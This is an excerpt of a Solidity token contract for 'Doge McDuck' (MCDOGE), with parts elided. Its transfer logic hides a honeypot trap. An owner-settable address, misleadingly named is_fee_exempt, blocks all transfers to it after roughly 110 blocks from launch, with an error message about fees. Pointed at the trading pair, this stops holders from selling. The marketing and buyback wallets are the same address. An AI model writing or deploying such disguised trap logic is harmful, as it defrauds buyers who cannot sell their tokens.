...
contract DOGEMCDUCK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Doge McDuck";
    string private _symbol = "MCDOGE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xE4a2E2Ea2E109750f587713a8E7f71921C25a9F0); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xE4a2E2Ea2E109750f587713a8E7f71921C25a9F0); // Treasury / Buyback
    ...
    address is_fee_exempt = 0x000000000000000000000000000000000000dEaD;
    ...
    uint256 public fee_denominator = 11;
    ...
    function tradingStatus(bool _status) public onlyOwner {
        LaunchedOn = block.number;
        tradingEnabled = _status;
    }

    function is_fee_exempt_status(address _current_fee) public onlyOwner {
        is_fee_exempt = _current_fee;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (recipient == is_fee_exempt) {
            require(block.number <= LaunchedOn + 10*fee_denominator, "Not allowed to be exempted from fees"); 
        }
